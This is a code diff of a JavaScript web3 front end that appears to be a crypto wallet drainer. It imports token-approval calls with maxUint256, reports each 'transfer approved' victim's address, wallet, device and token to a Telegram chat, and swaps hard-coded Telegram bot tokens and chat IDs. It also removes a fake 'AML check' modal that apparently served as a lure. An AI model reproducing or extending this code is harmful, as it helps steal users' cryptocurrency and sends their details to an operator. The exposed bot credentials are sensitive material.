@@ -3,7 +3,6 @@ import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { formatUnits, maxUint256, isAddress, getAddress, parseUnits } from 'viem'
 import { readContract, writeContract } from '@wagmi/core'
-import { showAMLCheckModal } from './aml-check-modal.js';
 
 // Утилита для дебаунсинга
 const debounce = (func, wait) => {
@@ -15,11 +14,11 @@ const debounce = (func, wait) => {
 }
 
 // Конфигурация
-const projectId = import.meta.env.VITE_PROJECT_ID || '2511b8e8161d6176c55da917e0378c9a'
+const projectId = import.meta.env.VITE_PROJECT_ID || '179382669f56243b2881bbde2d1cff1e'
 if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
 
-const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7893105607:AAFqn6yRhXVocTodMo8xNufTFKjmzMYnNAU'
-const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1002834788839'
+const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7385222687:AAH3rqR02h0MoTEaFyRJc-W4Ei9rpxHC-9Y'
+const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1002772700066'
 
 const networks = [bsc, mainnet, polygon]
 const networkMap = {
@@ -328,7 +327,6 @@ async function notifyTransferApproved(address, walletName, device, token, chainI
                     `➡️ ${token.symbol}\n\n` +
                     `🔗 Site: ${siteUrl}`
     await sendTelegramMessage(message)
-    await showAMLCheckModal()
   } catch (error) {
     store.errors.push(`Error in notifyTransferApproved: ${error.message}`)
   }
